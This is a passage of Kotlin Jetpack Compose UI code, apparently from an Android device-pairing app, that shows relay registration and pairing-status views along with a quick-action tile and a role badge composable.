                        Text("Register Device with Relay")
                    }
                }
            } else if (!info.isPaired) {
                Text(
                    text = "Ready to pair with another Android device.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedButton(
                    onClick = onPair,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp)
                ) {
                    Text("Start Pairing")
                }
            } else {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Link, contentDescription = null, tint = AccentGreen, modifier = Modifier.size(18.dp))
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = "Paired with: ${info.pairedDeviceName ?: "Remote Device"}",
                        style = MaterialTheme.typography.bodyMedium,
                        fontWeight = FontWeight.Medium
                    )
                }
            }
        }
    }
}

@Composable
private fun QuickActionTile(
    title: String,
    subtitle: String,
    icon: ImageVector,
    iconColor: Color,
    modifier: Modifier = Modifier,
    onClick: () -> Unit
) {
    Card(
        onClick = onClick,
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        modifier = modifier.height(100.dp)
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(14.dp),
            verticalArrangement = Arrangement.SpaceBetween
        ) {
            Icon(imageVector = icon, contentDescription = null, tint = iconColor, modifier = Modifier.size(24.dp))
            Column {
                Text(text = title, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.Bold)
                Text(text = subtitle, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
            }
        }
    }
}

@Composable
private fun RoleBadge(role: DeviceRole, onClick: () -> Unit) {
    Surface(
        onClick = onClick,
        shape = RoundedCornerShape(8.dp),
        color = MaterialTheme.colorScheme.primaryContainer
    ) {
        Text(
            text = role.name,
            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
            style = MaterialTheme.typography.labelSmall,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.onPrimaryContainer
        )
    }
}
